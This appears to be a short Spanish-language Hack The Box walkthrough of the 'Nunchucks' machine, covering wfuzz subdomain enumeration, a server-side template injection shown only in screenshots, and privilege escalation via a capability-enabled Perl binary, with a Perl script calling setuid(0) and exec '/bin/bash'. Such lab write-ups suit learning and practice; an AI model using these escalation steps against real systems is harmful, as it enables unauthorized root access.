# nunchucks-htb

## NMAP

Pues solo tiene estos puertos abiertos.

![image](https://github.com/gecr07/nunchucks-htb/assets/63270579/7a0ff0fa-6591-4adf-9a75-a1db06dabcc8)

Podemos ver que tiene virtual hosting...

![image](https://github.com/gecr07/nunchucks-htb/assets/63270579/b1455178-8241-4f9c-af9b-c0f4c9f6aa26)


```
wfuzz -c -t 200 --hw=2271 --hc=404 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.nunchucks.htb"  https://10.129.95.252/

```

Y encontramos el subdominio store.

![image](https://github.com/gecr07/nunchucks-htb/assets/63270579/fe16c383-0fc5-455c-a7f1-236bcdfbd567)

### SSTI (Server Side Template Injection)

Cuando puedes controlar lo que se refleja en una pagina prueba esta vulnerabilidad

![image](https://github.com/gecr07/nunchucks-htb/assets/63270579/696863be-7782-4d1e-9de7-8c1b4d824a5a)

El nombre de la maquina nos da pistas buscamos en hacktricks y si la payload funciona 

## RCE

![image](https://github.com/gecr07/nunchucks-htb/assets/63270579/e9e2b682-c848-4829-9843-1ae1d89a7725)

## Priv esca

Despues de hacer todos los checks...

```
getcap -r / 2>/dev/null
```

Y pues para pasar el app armo usa shebang

```
#!/usr/bin/perl
use POSIX;
setuid(0);
exec "/bin/bash";
```
















































